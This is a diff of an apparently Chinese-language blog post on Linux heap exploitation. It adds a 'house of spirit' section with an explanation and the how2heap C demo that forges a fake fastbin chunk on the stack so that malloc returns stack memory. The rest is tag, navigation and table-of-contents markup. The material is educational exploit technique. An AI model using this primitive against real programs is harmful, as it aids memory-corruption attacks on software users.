+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack.png" alt="fast bin stack"></p>
+<h3 id="The-house-of-spirit"><a href="#The-house-of-spirit" class="headerlink" title="The house of spirit"></a>The house of spirit</h3><p>  此攻击也是在栈中伪造fake chunk，和第二个攻击不同的是其只是在栈中声明了一个指针，而并没有通过malloc()函数来在堆中申请空间，接着将该指针赋值为特定的伪造的chunk的地址，随后free该指针，就将在栈中伪造的chunk添加到对应的fastbin中去了。具体的示例如下所示:</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</div><div class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</div><div class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</div><div class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</div><div class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></div><div class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</div><div class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the overwritten pointer.\n"</span>);</div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>  示例的结果如下图所示:</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/houseofspirit.png" alt="house of spirit"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a></li>
+</ul>
 
       
     </div>
@@ -516,9 +499,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/LLVM/" rel="tag"># LLVM</a>
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
           
-            <a href="/tags/Sanitizer/" rel="tag"># Sanitizer</a>
+            <a href="/tags/fastbin/" rel="tag"># fastbin</a>
           
         </div>
       
@@ -531,8 +514,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/20/angr-bomb/" rel="next" title="使用angr和Radare解决CMU的二进制炸弹">
-                <i class="fa fa-chevron-left"></i> 使用angr和Radare解决CMU的二进制炸弹
+              <a href="/2017/09/22/ptmalloc堆内存管理/" rel="next" title="ptmalloc堆内存管理">
+                <i class="fa fa-chevron-left"></i> ptmalloc堆内存管理
               </a>
             
           </div>
@@ -540,10 +523,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/22/ptmalloc堆内存管理/" rel="prev" title="ptmalloc堆内存管理">
-                ptmalloc堆内存管理 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -698,7 +677,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#AddressSanitizer简介"><span class="nav-number">1.</span> <span class="nav-text">AddressSanitizer简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AddressSanitizer算法"><span class="nav-number">2.</span> <span class="nav-text">AddressSanitizer算法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内存映射"><span class="nav-number">2.1.</span> <span class="nav-text">内存映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#插桩"><span class="nav-number">2.2.</span> <span class="nav-text">插桩</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态运行库"><span class="nav-number">2.3.</span> <span class="nav-text">动态运行库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AddressSanitizer源码分析"><span class="nav-number">3.</span> <span class="nav-text">AddressSanitizer源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Global-Variable"><span class="nav-number">3.1.</span> <span class="nav-text">Global Variable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack-Variable"><span class="nav-number">3.2.</span> <span class="nav-text">Stack Variable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap-Variable"><span class="nav-number">3.3.</span> <span class="nav-text">Heap Variable</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景介绍"><span class="nav-number">1.</span> <span class="nav-text">背景介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">fastbin漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-double-free"><span class="nav-number">2.1.</span> <span class="nav-text">fastbin double free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fast-bin-double-free-in-stack"><span class="nav-number">2.2.</span> <span class="nav-text">fast bin double free in stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-house-of-spirit"><span class="nav-number">2.3.</span> <span class="nav-text">The house of spirit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
